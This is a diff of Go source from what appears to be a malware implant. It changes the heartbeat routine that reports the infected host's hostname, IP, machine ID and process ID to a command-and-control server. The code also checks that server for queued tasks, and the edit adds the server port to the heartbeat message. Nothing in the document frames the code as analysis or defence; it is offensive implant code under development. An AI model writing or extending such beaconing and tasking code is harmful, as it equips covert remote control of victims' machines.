@@ -47,7 +47,7 @@ func EncodeDecodeData(data []byte) []byte {
 }
 
 // GenerateHeartbeat generates a heartbeat protobuf object to send back to the C2 server
-func GenerateHeartbeat() pb.Heartbeat {
+func GenerateHeartbeat(port int) pb.Heartbeat {
 	implant_id, _ := machineid.ProtectedID(XOR_KEY)
 	host, err := host.Info()
 	var hostname string
@@ -59,6 +59,7 @@ func GenerateHeartbeat() pb.Heartbeat {
 	return pb.Heartbeat{
 		Hostname:  hostname,
 		Ip:        BOX_IP,
+		Port:      int64(port),
 		MachineId: implant_id,
 		Pid:       int64(os.Getpid()),
 		SentAt:    &timestamppb.Timestamp{},
@@ -66,9 +67,9 @@ func GenerateHeartbeat() pb.Heartbeat {
 }
 
 // SendHeartbeat sends a heartbeat back to the C2 server via a pre-existing connection
-func SendHeartbeat(c *net.Conn) error {
+func SendHeartbeat(c *net.Conn, port int) error {
 	// Generate and marshal the heartbeat object
-	hb := GenerateHeartbeat()
+	hb := GenerateHeartbeat(port)
 	hbBytes, err := proto.Marshal(&hb)
 	if err != nil {
 		return fmt.Errorf("couldn't marshalling heartbeat: %v", err)
@@ -158,7 +159,7 @@ func CheckForTasks(serverIp string, serverPort int) bool {
 	defer (*c).Close()
 
 	// Send a heartbeat to the server asking for queued tasks
-	err = SendHeartbeat(c)
+	err = SendHeartbeat(c, serverPort)
 	if err != nil {
 		return false
 	}
